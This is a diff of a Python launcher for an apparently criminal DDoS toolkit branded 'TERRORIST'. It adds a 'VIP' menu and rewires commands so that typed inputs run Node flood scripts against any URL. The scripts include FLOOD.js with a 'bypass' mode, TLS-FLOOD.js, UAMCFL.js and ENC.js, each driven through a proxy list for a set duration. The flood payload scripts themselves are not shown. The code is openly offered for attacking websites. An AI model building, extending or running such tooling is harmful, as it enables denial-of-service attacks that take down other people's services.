@@ -156,14 +156,14 @@ def layer7():
                \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                     ════╦════════════════════════════════════════════════╦════
                         ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
-                        ║   \x1b[38;5;160mTYPE\x1b[38;5;255m [ \033[32mMETHOD\x1b[38;5;255m ] [ \033[32mURL\x1b[38;5;255m ] [ \033[32mTIME\x1b[38;5;255m ]\x1b[38;5;160m TO ATTACK   ║
+                        ║      \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHOD\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                     ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║        ●  CHAOS  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  DNK     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
-                    ║        ●  404    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║        ●  FLOOD  [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║        ●  HULK   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  TLX     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
-                    ║        ●  KILLER [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  ENC     [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]       ║
-                    ║        ●  SPIKE  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  BROWSER [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]       ║
+                    ║       ●  CHAOS   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  DNK     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║ 
+                    ║       ●  SPIKE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  CURSE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  BROWSER [\x1b[38;2;134;20;246mPOWER!\x1b[38;5;160m]    ●  CF      [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  HULK    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  TLX     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  KILLER  [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  SPIKE   [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
+                    ║       ●  404     [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer7\x1b[38;5;160m]       ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -209,14 +209,35 @@ def layer4():
                \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
                     ════╦════════════════════════════════════════════════╦════
                         ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
-                        ║   \x1b[38;5;160mTYPE\x1b[38;5;255m [ \033[32mMETHOD\x1b[38;5;255m ] [ \033[32mURL\x1b[38;5;255m ] [ \033[32mTIME\x1b[38;5;255m ]\x1b[38;5;160m TO ATTACK   ║
+                        ║      \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHOD\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
                     ╔═══╩════════════════════════════════════════════════╩═══╗
-                    ║        ●  HOME   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
-                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
-                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
-                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
-                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  NONE    [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]       ║
-                    ║        ●  NONE   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]                              ║
+                    ║       ●  HOME   [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]    ●  STRESS  [\x1b[38;2;134;20;246mLayer4\x1b[38;5;160m]        ║
+                    ╚════════════════════════════════════════════════════════╝
+\033[0m""")
+
+def vip():
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
+               ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
+               ║          \x1b[38;5;160m        ;:::::;       ;         OOOOOOOO                ║
+               ║          \x1b[38;5;160m       ,;::::::;     ;'         / OOOOOOO               ║
+               ║          \x1b[38;5;160m     ;::::::::██╗   ██╗██╗██████╗ / DOOOOOO             ║
+               ║          \x1b[38;5;160m   .';::::::::██║   ██║██║██╔══██╗     DOOOO            ║
+               ║          \x1b[38;5;160m  ,::::::;::::██║   ██║██║██████╔╝       DOOO           ║
+               ║          \x1b[38;5;160m ;`::::::`':::╚██╗ ██╔╝██║██╔═══╝         DOOO          ║
+               ║          \x1b[38;5;160m :`:::::::`;:::╚████╔╝:██║██║ /            DOOO         ║
+               ║          \x1b[38;5;160m ::`:::::::`;:::╚═══╝ ;╚═╝╚═╝/              DOO         ║
+               ║          \x1b[38;5;160m `:`:::::::`;:::::: ;::::::#/               DOO         ║
+               ║          \x1b[38;5;160m  :::`:::::::`;; ;:::::::::##                OO         ║
+               ║          \x1b[38;5;160m  ::::`:::::::`;::::::::;:::#                OO         ║
+               \x1b[38;5;160m╚══════════════════════════════════════════════════════════════════╝
+                    ════╦════════════════════════════════════════════════╦════
+                        ║              \033[32mWELCOME TO \033[33mTERRORIST\x1b[38;5;160m              ║
+                        ║      \x1b[38;5;160mTYPE '\x1b[38;5;255mMETHOD\x1b[38;5;160m' TO SEE METHOD OF ATTACK     ║
+                    ╔═══╩════════════════════════════════════════════════╩═══╗
+                    ║    ●  BOW        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  FLOOD      [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
+                    ║    ●  HTTP-LOAD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  TLS-FLOOD  [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
+                    ║    ●  ENC        [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ●  UAM-CFL    [\x1b[38;2;134;20;246mOnline\x1b[38;5;160m]    ║
                     ╚════════════════════════════════════════════════════════╝
 \033[0m""")
 
@@ -267,7 +288,7 @@ def main():
               \x1b[38;5;160m            ;::::;  :;                        ________________________________
               \x1b[38;5;160m          ;:::::'    :;                     /\                               |
               \x1b[38;5;160m         ;:::::;      ;.                    \_|                              |
-              \x1b[38;5;160m        ,:::::' ▄▄▄▄▄▄ ;           OOO       |  Type '\x1b[38;5;255mhelp\x1b[38;5;160m' to see them all  |
+              \x1b[38;5;160m        ,:::::' \x1b[38;5;255m▄▄▄▄▄▄\x1b[38;5;160m ;           OOO       |  Type '\x1b[38;5;255mhelp\x1b[38;5;160m' to see them all  |
               \x1b[38;5;160m        ::::::;        ;          OOOOO      |                               |
               \x1b[38;5;160m        ;:::::;        ;         OOOOOOOO    |   ____________________________|
               \x1b[38;5;160m       ,;::::::;      ;'        / OOOOOOO     \_/____________________________/
@@ -302,6 +323,8 @@ def main():
                         menu()
                 if sinput == "layer7" or sinput == "LAYER7" or sinput == "l7" or sinput == "L7":
                         layer7()
+                if sinput == "vip" or sinput == "VIP" or sinput == "V1P" or sinput == "v1p":
+                        vip()
                 if sinput == "tool" or sinput == "TOOL" or sinput == "TOOLS" or sinput == "tools":
                         tools()
                 if sinput == "layer4" or sinput == "LAYER4" or sinput == "l4" or sinput == "L4":
@@ -325,11 +348,12 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                mode = sin.split()[3]
                                 os.system ("clear")
-                                os.system(f'cd L7 && node FLOOD.js {url} {time} 64 10 proxy.txt bypass')  
+                                os.system(f'cd VIP && node FLOOD.js {url} {time} 64 10 proxy.txt {mode}')  
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <flood/bypass>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 bypass')
 
                 elif sinput == "BOW" or sinput == "bow":
                         try:
@@ -457,7 +481,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 requests = sin.split()[3]
-                                os.system(f'cd L7 && node TLS-FLOOD.js {url} {time} {requests} 10 proxy.txt')
+                                os.system(f'cd VIP && node TLS-FLOOD.js {url} {time} {requests} 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mTLS-FLOOD <url> <time> <request per ip>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mTLS-FLOOD https://example.com 120 8')
@@ -466,7 +490,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                os.system(f'cd VIP && node HTTP-MARS.js {url} {time} 64 10 proxy.txt')
+                                os.system(f'cd VIP && node HTTP-LOAD.js {url} {time} 64 10 proxy.txt')
                                 os.system ("clear")
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mHTTP-LOAD <url> <time>")
@@ -486,7 +510,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                os.system(f'cd VIP && node BYPASS.js {url} {time} 64 10 proxy.txt')
+                                os.system(f'cd VIP && node UAMCFL.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mUAMCFL <url> <time>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mUAMCFL https://example.com 120')
@@ -496,7 +520,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
-                                os.system(f'cd L7 && node Enc.js {url} {time} {rate} 10 proxy.txt')
+                                os.system(f'cd VIP && node ENC.js {url} {time} {rate} 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m]: \x1b[38;5;255mENC <url> <time> <rate>")
                                 print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mENC https://example.com 120 64')
@@ -514,7 +538,7 @@ def main():
                 else:
                         try:
                                 cmd=sin.split()[0]
-                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT"]
+                                excluded_keywords = ["cls", "help", "HELP", "RULES", "rules", "rule", "RULE", "kill", "KILL", "exit", "EXIT", "l4", "L4", "layer4", "LAYER4", "l7", "L7", "layer7", "LAYER7", "tool", "tools", "TOOL", "TOOLS", "shut", "SHUT", "vip", "VIP", "V1P", "v1p"]
                                 
                                 if cmd not in excluded_keywords:
                                   print(" \x1b[38;5;160m[ ! ] Command : [ \x1b[38;5;255m"+cmd+" \x1b[38;5;160m] Not Found\n [ > ] Use '\x1b[38;5;255mhelp\x1b[38;5;160m' to see all commands.")
